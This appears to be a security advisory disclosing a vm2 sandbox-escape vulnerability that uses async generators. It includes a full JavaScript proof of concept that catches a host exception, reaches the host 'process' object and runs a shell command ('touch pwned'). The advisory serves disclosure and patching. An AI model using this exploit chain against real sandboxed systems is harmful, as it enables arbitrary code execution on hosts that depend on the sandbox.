summary: "vm2 Has a Sandbox Breakout Using Async Generator\n### Summary\n\nVM2 suffers from\
  \ a sandbox breakout vulnerability. This allows attackers to write code which can escape from\
  \ the VM2 sandbox and execute arbitrary commands on the host system.\n\n### Details\n\nIt\
  \ is possible to catch a host exception using the `yield*` expression inside an async generator.\
  \ When the generator is closed using the `return` function, the value is awaited on and exceptions\
  \ thrown in the `then` call will be catched by the runtime and passed to the `yield*` iterator\
  \ as the next value.\n\n### PoC\n\n```js\nconst {VM} = require(\"vm2\");\nconst vm = new VM();\n\
  console.log(vm.run(`\nclass E extends Error {}\nfunction so(d) {\n\tif (d > 0) so(d-1);\n\t\
  const e = new E();\n\te.stack;\n\tthrow e;\n}\nasync function* helper() {\n\tyield* {\n\t\t\
  [Symbol.asyncIterator]: ()=>({\n\t\t\tnext: v=>({value: v, done: false})\n\t\t})\n\t};\n}\n\
  async function doCatch(f) {\n\tconst i=helper();\n\tawait i.next();\n\tconst v = await i.return({then(r){f();r();}});\n\
  \treturn v.value;\n}\n(async function f() {\n\tlet min = 0;\n\tlet max = 10000000;\n\twhile\
  \ (min<max) {\n\t\tconst mid = (min+max)>>1;\n\t\tconst e = await doCatch(()=>so(mid));\n\t\
  \tif (e.name===\"RangeError\" && !(e instanceof RangeError)) {\n\t\t\te.constructor.constructor(\"\
  return process\")().mainModule.require('child_process').execSync('touch pwned');\n\t\t\treturn;\n\
  \t\t}\n\t\tif (e instanceof E) {\n\t\t\tmin = mid+1;\n\t\t} else {\n\t\t\tmax = mid;\n\t\t\
  }\n\t}\n})();\n`));\n```\n\n### Impact\n\nAttackers can perform Remote Code Execution under\
  \ the assumption that arbitrary code can be executed inside the context of a vm2 sandbox."
